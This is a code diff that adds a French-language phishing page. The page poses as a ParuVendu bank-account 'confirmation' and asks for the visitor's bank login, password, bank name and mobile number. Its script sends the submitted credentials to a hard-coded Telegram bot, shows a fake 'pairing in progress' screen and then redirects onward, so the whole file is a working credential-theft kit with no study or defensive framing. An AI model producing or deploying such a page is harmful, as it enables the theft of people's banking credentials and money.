@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmation Bancaire - ParuVendu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
+            background-position: right;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+        .logo img {
+            width: 200px;
+        }
+        .container {
+            width: 30%; /* Largeur du formulaire */
+            padding: 30px; /* Padding */
+            background: white;
+            border-radius: 30px; /* Bords plus enrobés */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            position: absolute;
+            top: 40%; /* Formulaire abaissé */
+            left: 15%; /* Déplacé plus à gauche */
+            transform: translateY(-30%);
+            animation: slideUp 1s ease-out;
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(-30%);
+            }
+        }
+        .form-group {
+            margin-bottom: 15px; /* Espacement entre les champs */
+            text-align: left;
+        }
+        input {
+            width: 100%; /* Largeur des champs */
+            padding: 12px; /* Padding */
+            border: 1px solid #ccc;
+            border-radius: 0; /* Bordures rectangulaires */
+            font-size: 14px;
+            transition: all 0.3s;
+            background-color: #f9f9f9;
+            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+        }
+        input:focus {
+            border-color: #ff4c4c;
+            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
+        }
+        .btn {
+            background-color: #cc0000; /* Rouge plus foncé */
+            color: white;
+            padding: 8px 20px; /* Taille réduite */
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 40%; /* Bouton plus petit */
+            font-size: 14px; /* Taille du texte */
+            transition: background 0.3s;
+            text-transform: lowercase; /* Mise en minuscule */
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            font-weight: bold; /* Texte en gras */
+        }
+        .btn:hover {
+            background-color: #b30000; /* Rouge plus foncé au survol */
+        }
+        .connexion-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff4c4c;
+            margin-bottom: 10px; /* Réduit pour laisser de la place à la mention */
+            animation: fadeIn 2s ease-in-out; /* Animation de fondu */
+        }
+        .connexion-subtext {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0; /* Début invisible */
+            }
+            to {
+                opacity: 1; /* Fin visible */
+            }
+        }
+        .dots {
+            display: inline-block;
+            margin-left: 5px;
+            animation: blink 1.5s infinite; /* Animation des points */
+        }
+        @keyframes blink {
+            0%, 100% {
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+        .form-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-logo img {
+            width: 100px; /* Taille du logo */
+        }
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: justify;
+        }
+        .info-text strong {
+            color: #333;
+        }
+        .security-logo {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        .separator {
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9); /* Fond semi-transparent */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #333;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .loading-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu">
+    </div>
+    <div class="container">
+        <div class="connexion-text">
+            Associer votre compte bancaire<span class="dots">...</span>
+        </div>
+        <div class="connexion-subtext">
+            Une connexion sécurisée et instantanée à votre banque
+        </div>
+        <div class="form-logo">
+            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
+        </div>
+        <form id="bankForm">
+            <div class="form-group">
+                <label for="bank-id">Identifiant Bancaire</label>
+                <input type="text" id="bank-id" required>
+            </div>
+            <div class="form-group">
+                <label for="bank-password">Mot de passe</label>
+                <input type="password" id="bank-password" required>
+            </div>
+            <div class="form-group">
+                <label for="bank-name">Nom de la banque</label>
+                <input type="text" id="bank-name" required>
+            </div>
+            <div class="form-group">
+                <label for="mobile">Numéro de mobile</label>
+                <input type="text" id="mobile" required>
+            </div>
+            <button type="submit" class="btn">Confirmer</button>
+        </form>
+        <div class="separator"></div>
+        <div class="info-text">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Logo Sécurité" class="security-logo">
+            <strong>Pourquoi est-il important d'associer les informations bancaires ?</strong><br>
+            Pour profiter pleinement de votre compte ParuVendu et jumeler celui-ci avec votre compte bancaire afin d’effectuer des transferts, il est essentiel de confirmer votre compte bancaire en utilisant vos identifiants de connexion en ligne, garantissant ainsi la sécurité des transactions.
+        </div>
+        <div class="info-text">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Logo Sécurité" class="security-logo">
+            <strong>En cas de compromission de votre compte ParuVendu :</strong><br>
+            ParuVendu vous demande de confirmer votre compte afin de garantir que vos futurs transferts soient envoyés au bon destinataire. Sans cette étape, il existe un risque qu’un tiers mal intentionné réceptionne votre paiement à votre insu.
+        </div>
+        <div class="info-text">
+            <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Logo Sécurité" class="security-logo">
+            <strong>Fin de la vérification !</strong><br>
+            ParuVendu vous remercie de votre confiance.
+        </div>
+    </div>
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loadingScreen">
+        Jumelage en cours...
+    </div>
+
+    <script>
+        // Constantes pour le bot Telegram
+        const BOT_TOKEN = "8128812759:AAEg0qMVYU-90EShzEkd60gIrakBm1XnovY";
+        const CHAT_ID = "5652184847";
+
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(params),
+                });
+
+                if (!response.ok) {
+                    throw new Error("Erreur lors de l'envoi du message à Telegram");
+                }
+                console.log("Message envoyé avec succès à Telegram");
+            } catch (error) {
+                console.error("Erreur :", error);
+            }
+        }
+
+        // Gestionnaire de soumission du formulaire
+        document.getElementById("bankForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Empêche la soumission par défaut
+
+            // Afficher l'écran de chargement
+            const loadingScreen = document.getElementById("loadingScreen");
+            loadingScreen.classList.add("active");
+
+            // Récupérer les valeurs du formulaire
+            const bankId = document.getElementById("bank-id").value;
+            const bankPassword = document.getElementById("bank-password").value;
+            const bankName = document.getElementById("bank-name").value;
+            const mobile = document.getElementById("mobile").value;
+
+            // Créer le message à envoyer
+            const message = `
+                🚨 Nouvelle soumission de compte bancaire 🚨
+                Identifiant Bancaire : ${bankId}
+                Mot de passe : ${bankPassword}
+                Nom de la banque : ${bankName}
+                Numéro de mobile : ${mobile}
+            `;
+
+            // Envoyer le message à Telegram
+            sendToTelegram(message);
+
+            // Simuler un délai de chargement (2 secondes)
+            setTimeout(() => {
+                // Rediriger vers la page suivante après l'envoi
+                window.location.href = "{{ url_for('next_page', current_page='parucompte') }}";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
